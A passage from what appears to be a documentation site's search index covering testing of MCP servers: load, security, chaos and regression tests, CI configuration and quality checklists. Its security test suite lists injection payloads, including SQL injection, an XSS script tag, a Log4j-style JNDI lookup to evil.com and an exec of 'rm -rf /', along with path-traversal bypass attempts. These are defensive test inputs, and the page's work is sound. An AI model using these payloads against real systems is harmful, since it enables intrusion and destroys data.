result[\"error_rate\"] &lt; 0.01  # &lt;1% error rate\n    \n    async def test_concurrent_users_throughput(self):\n        \"\"\"Test throughput under concurrent load\"\"\"\n        tester = LoadTester(\"http://localhost:8000\")\n        \n        result = await tester.load_test(\n            tool_name=\"process_data\",\n            params={\"text\": \"load test\", \"options\": {}},\n            concurrent_users=10,\n            duration_seconds=60\n        )\n        \n        assert result[\"requests_per_second\"] &gt; 50  # Minimum throughput\n        assert result[\"error_rate\"] &lt; 0.05  # &lt;5% error rate under load\n</code></pre>"},{"location":"test/#security-and-safety-testing","title":"Security and Safety Testing","text":""},{"location":"test/#security-test-suite","title":"Security Test Suite","text":"<p>Validate security controls and resistance to common attacks:</p> <pre><code>class SecurityTester:\n    def __init__(self, server_url: str):\n        self.server_url = server_url\n    \n    async def test_input_injection_attacks(self):\n        \"\"\"Test resistance to injection attacks\"\"\"\n        injection_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"&lt;script&gt;alert('xss')&lt;/script&gt;\",\n            \"{{7*7}}\",  # Template injection\n            \"${jndi:ldap://evil.com/a}\",  # Log4j style\n            \"'; exec('import os; os.system(\\\"rm -rf /\\\")')\"\n        ]\n        \n        for payload in injection_payloads:\n            try:\n                result = await call_tool(\"process_data\", {\"text\": payload})\n                \n                # Result should be sanitized, not executed\n                assert payload not in str(result)\n                assert \"&lt;script&gt;\" not in str(result).lower()\n                assert \"drop table\" not in str(result).lower()\n                \n            except ValueError:\n                # Input rejection is acceptable\n                pass\n    \n    async def test_authorization_bypass_attempts(self):\n        \"\"\"Test authorization cannot be bypassed\"\"\"\n        bypass_attempts = [\n            {\"token\": \"invalid_token\"},\n            {\"token\": \"../../../admin_token\"},\n            {\"user_id\": -1},\n            {\"permissions\": [\"admin\", \"all\"]},\n        ]\n        \n        for attempt in bypass_attempts:\n            with pytest.raises((PermissionError, AuthenticationError)):\n                await call_tool_with_context(\"admin_tool\", {}, context=attempt)\n    \n    async def test_rate_limiting(self):\n        \"\"\"Test rate limiting prevents abuse\"\"\"\n        # Make rapid requests to trigger rate limiting\n        tasks = []\n        for i in range(100):  # Exceed rate limit\n            tasks.append(call_tool(\"process_data\", {\"text\": f\"test {i}\"}))\n        \n        results = await asyncio.gather(*tasks, return_exceptions=True)\n        \n        # Some requests should be rate limited\n        rate_limited_count = sum(1 for r in results if isinstance(r, RateLimitError))\n        assert rate_limited_count &gt; 0\n</code></pre>"},{"location":"test/#chaos-testing-and-fault-injection","title":"Chaos Testing and Fault Injection","text":"<p>Test resilience under failure conditions:</p> <pre><code>class ChaosTester:\n    async def test_dependency_failures(self):\n        \"\"\"Test behavior when external dependencies fail\"\"\"\n        with patch('external_service.call') as mock_service:\n            # Simulate various failure modes\n            failure_scenarios = [\n                ConnectionError(\"Connection refused\"),\n                TimeoutError(\"Request timeout\"),\n                HTTPError(\"500 Internal Server Error\"),\n                json.JSONDecodeError(\"Invalid JSON\", \"\", 0)\n            ]\n            \n            for error in failure_scenarios:\n                mock_service.side_effect = error\n                \n                result = await call_tool(\"external_dependent_tool\", {\"param\": \"test\"})\n                \n                # Should fail gracefully with meaningful error\n                assert \"error\" in result\n                assert \"temporarily unavailable\" in result[\"error\"].lower()\n    \n    async def test_resource_exhaustion(self):\n        \"\"\"Test behavior under resource constraints\"\"\"\n        # Test with large inputs to stress memory\n        large_input = \"x\" * (10 * 1024 * 1024)  # 10MB\n        \n        try:\n            result = await call_tool(\"process_data\", {\"text\": large_input})\n            \n            # Should either process successfully or fail gracefully\n            assert result is not None\n            \n        except ResourceExhaustedError as e:\n            # Graceful resource exhaustion handling is acceptable\n            assert \"resource limit\" in str(e).lower()\n</code></pre>"},{"location":"test/#automated-testing-and-cicd-integration","title":"Automated Testing and CI/CD Integration","text":""},{"location":"test/#continuous-integration-pipeline","title":"Continuous Integration Pipeline","text":"<p>Integrate all testing levels into your CI/CD pipeline:</p> <pre><code># .github/workflows/test.yml (example)\nname: Comprehensive Testing Pipeline\n\non: [push, pull_request]\n\njobs:\n  unit-tests:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: '3.11'\n      \n      - name: Install dependencies\n        run: |\n          pip install uv\n          uv pip install -e .[test]\n      \n      - name: Run unit tests\n        run: |\n          pytest tests/unit/ -v --cov=src --cov-report=xml\n      \n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n  \n  integration-tests:\n    runs-on: ubuntu-latest\n    needs: unit-tests\n    steps:\n      - name: Start test server\n        run: |\n          python -m src.server &amp;\n          sleep 5\n      \n      - name: Run integration tests\n        run: |\n          pytest tests/integration/ -v\n  \n  agent-evaluation:\n    runs-on: ubuntu-latest\n    needs: integration-tests\n    steps:\n      - name: Run Agent Eval\n        run: |\n          python -m tests.agent_eval --iterations=5\n        env:\n          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n  \n  performance-tests:\n    runs-on: ubuntu-latest\n    needs: integration-tests\n    steps:\n      - name: Run performance tests\n        run: |\n          pytest tests/performance/ -v --timeout=300\n  \n  security-tests:\n    runs-on: ubuntu-latest\n    needs: unit-tests\n    steps:\n      - name: Run security scans\n        run: |\n          bandit -r src/\n          safety check\n          pytest tests/security/ -v\n</code></pre>"},{"location":"test/#test-automation-best-practices","title":"Test Automation Best Practices","text":"<p>Automated test management:</p> <pre><code># conftest.py - Pytest configuration and fixtures\nimport pytest\nimport asyncio\nfrom unittest.mock import Mock\n\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    \"\"\"Create event loop for async tests\"\"\"\n    loop = asyncio.new_event_loop()\n    yield loop\n    loop.close()\n\n@pytest.fixture\ndef mock_external_service():\n    \"\"\"Mock external service for isolated testing\"\"\"\n    with patch('src.services.external_api') as mock:\n        mock.get_data.return_value = {\"status\": \"success\", \"data\": \"test\"}\n        yield mock\n\n@pytest.fixture\nasync def test_server():\n    \"\"\"Start test server for integration tests\"\"\"\n    server = await start_test_server(port=8001)\n    yield server\n    await server.shutdown()\n\n# Parameterized tests for comprehensive coverage\n@pytest.mark.parametrize(\"input_data,expected\", [\n    (\"valid input\", \"processed: valid input\"),\n    (\"\", \"error: empty input\"),\n    (\"x\" * 1000, \"error: input too long\"),\n])\ndef test_input_variations(input_data, expected):\n    result = process_input(input_data)\n    assert expected in str(result)\n</code></pre>"},{"location":"test/#testing-standards-and-quality-gates","title":"Testing Standards and Quality Gates","text":""},{"location":"test/#coverage-targets-and-quality-metrics","title":"Coverage Targets and Quality Metrics","text":"<p>Establish clear quality thresholds:</p> <ul> <li>Unit test coverage: \u2265 85% for business logic, 100% for critical paths</li> <li>Integration test coverage: All MCP protocol interactions and external dependencies</li> <li>Agent evaluation score: \u2265 80% task completion rate across target models</li> <li>Performance targets: P95 latency &lt; 500ms, throughput &gt; 50 RPS under normal load</li> <li>Security validation: 100% of security test cases must pass</li> <li>Error handling: All error scenarios have explicit tests</li> </ul>"},{"location":"test/#pre-release-testing-checklist","title":"Pre-Release Testing Checklist","text":"<p>\u2705 Functional Testing - [ ] All unit tests passing with required coverage - [ ] Integration tests validate MCP protocol compliance - [ ] End-to-end workflows complete successfully - [ ] Cross-model agent evaluation meets thresholds</p> <p>\u2705 Performance Validation - [ ] Load tests confirm SLO compliance - [ ] Resource usage within acceptable limits - [ ] Concurrent user scenarios handled properly - [ ] Performance regression tests passing</p> <p>\u2705 Security and Safety - [ ] Input validation prevents injection attacks - [ ] Authorization controls properly enforced - [ ] Rate limiting prevents abuse - [ ] Audit logging captures required events</p> <p>\u2705 Reliability Testing - [ ] Chaos tests validate fault tolerance - [ ] Dependency failure scenarios handled gracefully - [ ] Circuit breakers and timeouts configured - [ ] Recovery procedures validated</p> <p>\u2705 Agent Compatibility - [ ] Agent Eval scores meet minimum thresholds - [ ] Tool discovery works across target models - [ ] Error messages are agent-friendly - [ ] Documentation supports agent understanding</p>"},{"location":"test/#regression-testing-and-continuous-monitoring","title":"Regression Testing and Continuous Monitoring","text":"<p>Maintain quality over time:</p> <pre><code>class RegressionTester:\n    def __init__(self):\n        self.baseline_metrics = self.load_baseline()\n    \n    async def detect_regressions(self, current_results: dict) -&gt; dict:\n        \"\"\"Compare current results against baseline\"\"\"\n        regressions = {}\n        \n        for metric, current_value in current_results.items():\n            baseline_value = self.baseline_metrics.get(metric)\n            \n            if baseline_value and self.is_regression(metric, current_value, baseline_value):\n                regressions[metric] = {\n                    \"current\": current_value,\n                    \"baseline\": baseline_value,\n                    \"regression_percentage\": self.calculate_regression_pct(\n                        current_value, baseline_value\n                    )\n                }\n        \n        return regressions\n    \n    def is_regression(self, metric: str, current: float, baseline: float) -&gt; bool:\n        \"\"\"Determine if current value represents a regression\"\"\"\n        thresholds = {\n            \"success_rate\": 0.05,  # 5% drop is significant\n            \"avg_response_time\": 0.20,  # 20% increase is significant\n            \"agent_eval_score\": 0.10,  # 10% drop is significant\n        }\n        \n        threshold = thresholds.get(metric, 0.15)  # Default 15%\n        \n        if metric in [\"success_rate\", \"agent_eval_score\"]:\n            # Lower is worse\n            return current &lt; baseline * (1 - threshold)\n        else:\n            # Higher is worse (latency, error rate)\n            return current &gt; baseline * (1 + threshold)\n</code></pre>"},{"location":"test/#testing-tools-and-infrastructure","title":"Testing Tools and Infrastructure","text":""},{"location":"test/#recommended-testing-stack","title":"Recommended Testing Stack","text":"<p>Core testing tools: - pytest: Primary testing framework with async support - pytest-cov: Code coverage measurement and reporting - pytest-mock: Mocking and patching capabilities - Agent Eval: AI agent evaluation framework - locust: Load testing and performance validation - bandit: Security vulnerability scanning - safety: Dependency vulnerability checking</p> <p>Infrastructure tools: - docker-compose: Reproducible testing environments - testcontainers: Integration testing with real dependencies - Github Actions / Jenkins: CI/CD pipeline automation - SonarQube: Code quality and security analysis - Grafana/Prometheus: Performance monitoring and alerting</p> <p>Next Steps: After comprehensive testing, proceed to Package for distribution preparation, then Deploy for production rollout strategies.</p> <p>See Also: Develop, Best Practices, Package, Deploy, Operate, Secure.</p>"},{"location":"use/","title":"Use","text":""},{"location":"use/#use","title":"Use","text":"<p>High-level guidance for how MCP servers are consumed by clients and hosts.</p>"},{"location":"use/#hosts-and-clients","title":"Hosts and Clients","text":"<ul> <li>Use supported MCP hosts (desktop, headless, IDEs) appropriate for your environment.</li> <li>Prefer gateway-mediated access for centralized authN/Z, routing, quotas, and policy.</li> </ul>"},{"location":"use/#integration-patterns","title":"Integration Patterns","text":"<ul> <li>Direct connection (stdio/http) for local, trusted use cases.</li> <li>Through a gateway for enterprise scenarios with many servers/tenants and shared controls.</li> </ul>"},{"location":"use/#authentication","title":"Authentication","text":"<ul> <li>Follow the spec for supported flows; avoid bespoke schemes. Keep tokens scoped, short\u2011lived, and auditable.</li> </ul>"},{"location":"use/#operational-considerations","title":"Operational Considerations","text":"<ul> <li>Provide clear discovery; document contracts and side effects.</li> <li>Publish SLOs and error catalogs; provide support contacts and runbooks.</li> </ul>"},{"location":"use/#good-citizen-guidance","title":"Good Citizen Guidance","text":"<ul> <li>Avoid long\u2011running client calls without async patterns.</li> <li>Respect rate limits and quotas; handle policy denials gracefully.</li> <li>Surface provenance and citations where appropriate for auditability.</li> </ul>"}]}